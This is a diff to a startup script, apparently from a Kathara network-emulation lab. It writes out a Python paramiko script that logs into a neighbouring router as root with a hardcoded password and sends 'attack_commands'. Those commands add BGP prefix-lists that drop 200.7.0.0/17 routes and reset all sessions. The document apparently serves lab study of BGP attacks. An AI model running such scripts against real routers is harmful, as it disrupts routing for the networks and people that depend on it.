@@ -1,6 +1,6 @@
-ifconfig eth0 inet 199.9.9.2/30
+ifconfig eth0 inet 180.20.20.2/30
 
-route add default gw 199.9.9.1
+route add default gw 180.20.20.1
 
 service ssh start
 
@@ -12,17 +12,17 @@ service ssh restart
 
 ssh-keygen
 
-ssh-copy-id root@199.9.9.1
+ssh-copy-id root@180.20.20.1
 
 printf "import paramiko \nfrom getpass import getpass \nimport time \
-\nhost = \"199.9.9.1\" \nport = 22 \nusername = \"root\" \npassword = \"kathara\" \
+\nhost = \"180.20.20.1\" \nport = 22 \nusername = \"root\" \npassword = \"kathara\" \
 \nremote_conn_pre = paramiko.SSHClient() \
 \nremote_conn_pre.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \
 \nremote_conn_pre.connect(host, port=22, username=username, password=password, look_for_keys=False, allow_agent=False) \
 \nremote_conn = remote_conn_pre.invoke_shell() \
 \noutput = remote_conn.recv(65535) \
 \nprint(output.decode(\"utf-8\")) \
-\nattack_commands = [\'vtysh%s', \'conf t%s', \'router bgp 7%s', \'neighbor 199.9.9.6 prefix-list partialInRouter6 in%s', \'ip prefix-list partialInRouter6 deny 200.7.0.0/24%s', \'ip prefix-list partialInRouter6 permit any%s', \'router bgp 7%s', \'neighbor 198.8.8.5 prefix-list partialInRouter3 in%s', \'ip prefix-list partialInRouter3 deny 200.7.0.0/24%s', \'ip prefix-list partialInRouter3 permit any%s', \'do clear ip bgp *%s', \'exit%s'] \
+\nattack_commands = [\'vtysh%s', \'conf t%s', \'router bgp 6%s', \'neighbor 180.20.20.6 prefix-list partialInRouter9 in%s', \'ip prefix-list partialInRouter9 deny 200.7.0.0/17 le 32%s', \'ip prefix-list partialInRouter9 permit any%s', \'router bgp 6%s', \'neighbor 199.9.9.5 prefix-list partialInRouter7 in%s', \'ip prefix-list partialInRouter7 deny 200.7.0.0/17 le 32%s', \'ip prefix-list partialInRouter7 permit any%s', \'do clear ip bgp *%s', \'exit%s'] \
 \n
 \nfor attack_command in attack_commands: \
 \n    remote_conn.send(attack_command) \
